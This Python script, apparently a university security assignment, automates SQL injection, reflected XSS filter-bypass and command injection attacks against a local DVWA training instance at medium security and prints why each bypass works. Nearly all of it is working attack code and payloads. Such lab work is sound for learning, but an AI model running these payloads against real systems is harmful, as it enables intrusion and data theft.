#!/usr/bin/env python3
import requests
import re
import time

BASE_URL = "http://localhost:8080"
session = requests.Session()

def get_csrf_token(html_content, token_name='user_token'):
    match = re.search(f"name='{token_name}' value='([^']+)'", html_content)
    if not match:
        match = re.search(f'name="{token_name}" value="([^"]+)"', html_content)
    return match.group(1) if match else None

def setup_dvwa():
    print("[*] Setting up DVWA database...")
    r = session.get(f"{BASE_URL}/setup.php")
    csrf_token = get_csrf_token(r.text)

    data = {'create_db': 'Create / Reset Database'}
    if csrf_token:
        data['user_token'] = csrf_token

    r = session.post(f"{BASE_URL}/setup.php", data=data)
    time.sleep(2)
    print("[+] Database setup complete")

def login():
    print("[*] Logging in to DVWA...")
    r = session.get(f"{BASE_URL}/login.php")
    csrf_token = get_csrf_token(r.text)

    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login'
    }
    if csrf_token:
        login_data['user_token'] = csrf_token

    r = session.post(f"{BASE_URL}/login.php", data=login_data, allow_redirects=True)

    if "index.php" in r.url or "logout" in r.text:
        print("[+] Login successful")
        return True

    print("[-] Login failed, trying database setup...")
    setup_dvwa()
    return login()

def set_security_level(level="medium"):
    print(f"[*] Setting security level to {level}...")
    r = session.get(f"{BASE_URL}/security.php")
    csrf_token = get_csrf_token(r.text)

    data = {
        'security': level,
        'seclev_submit': 'Submit'
    }
    if csrf_token:
        data['user_token'] = csrf_token

    r = session.post(f"{BASE_URL}/security.php", data=data)
    print(f"[+] Security level set to {level}")

def test_sql_injection():
    print("\n" + "="*60)
    print("SQL INJECTION ATTACK (Medium Security)")
    print("="*60)

    payloads = [
        "1 OR 1=1#",
        "1 OR 1=1",
        "1 OR 1=1-- -"
    ]

    for payload in payloads:
        print(f"\n[*] Trying payload: {payload}")
        data = {'id': payload, 'Submit': 'Submit'}
        r = session.post(f"{BASE_URL}/vulnerabilities/sqli/", data=data)

        if r.text.count("First name:") > 1:
            print(f"[+] SUCCESS! Payload bypassed medium security")
            print(f"\n[+] Explanation: Medium security uses mysql_real_escape_string()")
            print(f"    and POST method. The payload '{payload}' works because:")
            print(f"    - It doesn't use quotes, bypassing the escape function")
            print(f"    - Uses numeric context in OR clause where quotes aren't required")
            print(f"    - The OR 1=1 condition makes the WHERE clause always true")
            print(f"\n[+] Response preview:")
            start = r.text.find('<pre>')
            end = r.text.find('</pre>', start) if start != -1 else -1
            if start != -1 and end != -1:
                print(r.text[start:end+6].replace('<br />', '\n    '))
            return payload, r.text

    return None, None

def test_xss():
    print("\n" + "="*60)
    print("CROSS-SITE SCRIPTING ATTACK (Medium Security)")
    print("="*60)

    payloads = [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<sCript>alert(1)</sCript>",
        "<IMG SRC=x ONERROR=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "<iframe src=javascript:alert(1)>"
    ]

    for payload in payloads:
        print(f"\n[*] Trying payload: {payload}")
        params = {'name': payload, 'Submit': 'Submit'}
        r = session.get(f"{BASE_URL}/vulnerabilities/xss_r/", params=params)

        if ('<script>' in r.text.lower() or '<svg' in r.text.lower() or \
            'onerror' in r.text.lower() or '<iframe' in r.text.lower()) and \
           'alert' in r.text.lower():
            print(f"[+] SUCCESS! Payload bypassed medium security")
            print(f"\n[+] Explanation: Medium security blocks <script> tags")
            print(f"    but the payload bypasses it by:")
            if 'script' in payload.lower() and payload != payload.lower():
                print(f"    - Using mixed case (e.g., ScRiPt) to bypass lowercase filtering")
            elif 'onerror' in payload.lower():
                print(f"    - Using event handlers (onerror) instead of <script> tags")
            elif 'svg' in payload.lower():
                print(f"    - Using alternative HTML5 tags (svg) with event handlers")
            return payload, r.text

    return None, None

def test_command_injection():
    print("\n" + "="*60)
    print("COMMAND INJECTION ATTACK (Medium Security)")
    print("="*60)

    payloads = [
        "127.0.0.1 && whoami",
        "127.0.0.1 & whoami",
        "127.0.0.1 | whoami",
        "127.0.0.1; whoami",
        "127.0.0.1 || whoami"
    ]

    for payload in payloads:
        print(f"\n[*] Trying payload: {payload}")
        data = {'ip': payload, 'Submit': 'Submit'}
        r = session.post(f"{BASE_URL}/vulnerabilities/exec/", data=data)

        if "www-data" in r.text or any(word in r.text.lower() for word in ['root', 'apache', 'nginx']):
            print(f"[+] SUCCESS! Payload bypassed medium security")
            print(f"\n[+] Explanation: Medium security blocks some command separators")
            print(f"    but the payload bypasses it by:")
            if '&&' in payload:
                print(f"    - Using double ampersand (&&) which executes if first command succeeds")
            elif '&' in payload and '&&' not in payload:
                print(f"    - Using single ampersand (&) to run commands in background")
            elif '|' in payload and '||' not in payload:
                print(f"    - Using pipe (|) to chain commands")
            print(f"\n[+] Output shows command execution:")
            lines = r.text.split('\n')
            for line in lines:
                if 'www-data' in line or 'root' in line:
                    print(f"    {line.strip()}")
            return payload, r.text

    return None, None

def save_results(attack_name, payload, response):
    filename = f"/home/crescendum/USFQ/9no-Semestre/Seguridad/Deber3/part2_dvwa/{attack_name}_result.html"
    with open(filename, 'w') as f:
        f.write(f"<!-- Payload: {payload} -->\n")
        f.write(response)
    print(f"[*] Results saved to {filename}")

def main():
    print("="*60)
    print("DVWA ATTACK AUTOMATION - MEDIUM SECURITY")
    print("="*60)

    if not login():
        print("[-] Failed to login")
        return

    set_security_level("medium")
    time.sleep(1)

    sqli_payload, sqli_response = test_sql_injection()
    if sqli_payload:
        save_results("sqli", sqli_payload, sqli_response)

    time.sleep(1)

    xss_payload, xss_response = test_xss()
    if xss_payload:
        save_results("xss", xss_payload, xss_response)

    time.sleep(1)

    cmd_payload, cmd_response = test_command_injection()
    if cmd_payload:
        save_results("command_injection", cmd_payload, cmd_response)

    print("\n" + "="*60)
    print("ATTACK SUMMARY")
    print("="*60)
    print(f"SQL Injection:      {'SUCCESS - ' + sqli_payload if sqli_payload else 'FAILED'}")
    print(f"XSS:                {'SUCCESS - ' + xss_payload if xss_payload else 'FAILED'}")
    print(f"Command Injection:  {'SUCCESS - ' + cmd_payload if cmd_payload else 'FAILED'}")
    print("="*60)

if __name__ == "__main__":
    main()
